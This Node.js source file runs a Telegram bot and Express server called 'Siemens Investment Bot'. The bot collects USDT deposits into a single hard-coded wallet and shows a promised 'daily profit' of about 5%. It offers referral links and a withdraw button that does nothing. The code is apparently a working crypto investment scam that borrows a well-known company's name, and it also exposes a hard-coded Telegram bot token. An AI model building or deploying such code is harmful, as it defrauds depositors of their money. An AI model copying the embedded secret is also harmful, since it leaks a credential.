const express = require('express');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json());
app.use(cors());

const TELEGRAM_TOKEN = '8559882529:AAEaEMGDZkhe-HybjM2PZIKniDqJH-g50pc';
const ADMIN_CHAT_ID = '6559439220';
const MY_WALLET_ADDRESS = '0xDdAE2e4e81A39C4E68faFAFd8b6aa05192f7A123';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const db = new sqlite3.Database('./app.db', (err) => {
if (err) console.error('Database connection error:', err.message);
else console.log('Connected to SQLite database.');
});

db.serialize(() => {
db.run(`CREATE TABLE IF NOT EXISTS users (
id INTEGER PRIMARY KEY,
total_deposit REAL DEFAULT 0,
balance REAL DEFAULT 62.20,
referred_by INTEGER,
ref_count INTEGER DEFAULT 0,
voucher_count INTEGER DEFAULT 0
)`);
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/user', (req, res) => {
const userId = req.query.userId || '6559439220';

db.get('SELECT * FROM users WHERE id = ?', [userId], (err, row) => {
if (err || !row) {
db.run('INSERT OR IGNORE INTO users (id, balance, total_deposit) VALUES (?, 0, 0)', [userId], () => {
res.json({
userId: userId,
balance: 0.00,
totalDeposited: 0.00,
refCount: 0,
voucherCount: 0
});
});
} else {
res.json({
userId: userId,
balance: row.balance,
totalDeposited: row.total_deposit,
refCount: row.ref_count || 0,
voucherCount: row.voucher_count || 0
});
}
});
});

const walletData = {
status: 'success',
address: MY_WALLET_ADDRESS,
network: 'BEP20 (USDT)'
};

app.get('/api/deposit', (req, res) => res.json(walletData));
app.get('/api/wallet', (req, res) => res.json(walletData));
app.get('/api/get-address', (req, res) => res.json(walletData));

function sendMainMenu(chatId, text) {
bot.sendMessage(chatId, text, {
reply_markup: {
inline_keyboard: [
[{ text: '💳 Deposit USDT', callback_data: 'deposit' }],
[{ text: '📊 Dashboard', callback_data: 'dashboard' }, { text: '👥 Referral Link', callback_data: 'referral' }],
[{ text: '💸 Withdraw Balance', callback_data: 'withdraw' }]
]
}
});
}

bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const referrerId = match[1] ? parseInt(match[1]) : null;

db.get('SELECT * FROM users WHERE id = ?', [chatId], (err, user) => {
if (!user) {
db.run('INSERT INTO users (id, referred_by) VALUES (?, ?)', [chatId, referrerId], (err) => {
if (!err) sendMainMenu(chatId, 'Welcome to Siemens Investment Bot!');
});
} else {
sendMainMenu(chatId, 'Welcome back! Main Menu:');
}
});
});

bot.on('callback_query', async (query) => {
try { await bot.answerCallbackQuery(query.id); } catch (e) {}

const chatId = query.message.chat.id;
const data = query.data;

if (data === 'deposit') {
const text = '💳 *Deposit USDT (BEP-20)*\n\nSend your deposit to the following BEP-20 address:\n\n`' + MY_WALLET_ADDRESS + '`\n\n_Note: Minimum deposit is 20 USDT._';
bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

if (data === 'dashboard') {
db.get('SELECT total_deposit, balance FROM users WHERE id = ?', [chatId], (err, user) => {
if (user) {
const dailyProfit = Math.floor((user.total_deposit || 0) / 20) * 1;
const text = '📊 *User Dashboard*\n\n💰 Total Deposit: *' + (user.total_deposit || 0) + ' USDT*\n📈 Daily Profit: *' + dailyProfit + ' USDT/day*\n💵 Available Balance: *' + (user.balance || 0) + ' USDT*';
bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}
});
}

if (data === 'referral') {
bot.getMe().then((botInfo) => {
const refLink = 'https://t.me/' + botInfo.username + '?start=' + chatId;
bot.sendMessage(chatId, '👥 *Your Referral Link:*\n\n`' + refLink + '`', { parse_mode: 'Markdown' });
});
}
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
console.log('Server and Bot are running on port ' + PORT);
});
